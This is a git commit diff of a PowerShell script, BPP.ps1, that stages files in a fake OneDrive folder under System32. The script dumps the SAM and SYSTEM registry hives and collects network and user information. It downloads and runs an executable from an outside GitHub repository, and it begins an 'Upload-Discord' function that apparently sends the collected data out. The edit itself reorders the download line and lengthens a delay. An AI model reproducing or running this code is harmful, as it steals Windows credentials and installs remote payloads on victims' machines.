f778874f7e55678ba86e5b68af0e2aef8da6ce0b
skekic16 <151707511+skekic16@users.noreply.github.com>
2024-01-06 17:47:34 -0600

    Update BPP.ps1

--- BPP.ps1
+++ BPP.ps1
@@ -1,11 +1,11 @@
 cd $env:SystemRoot\System32\Microsoft_OneDrive\BQ
+iwr https://github.com/skekic16/lol/raw/main/d2.1.exe?dl=1 -O $env:SystemRoot\System32\Microsoft_OneDrive\BQ\d2.1.exe
 ipconfig /all | Out-File -FilePath $env:SystemRoot\System32\Microsoft_OneDrive\BQ\ipconfig.txt
 net user | Out-File -FilePath $env:SystemRoot\System32\Microsoft_OneDrive\BQ\users.txt
 reg save HKLM\sam ./sam.save
 reg save HKLM\system ./system.save
-iwr https://github.com/skekic16/lol/raw/main/d2.1.exe?dl=1 -O $env:SystemRoot\System32\Microsoft_OneDrive\BQ\d2.1.exe
 Start-process "$env:SystemRoot\System32\Microsoft_OneDrive\BQ\d2.1.exe"
-start-sleep 5
+start-sleep 15
 
 
 function Upload-Discord {
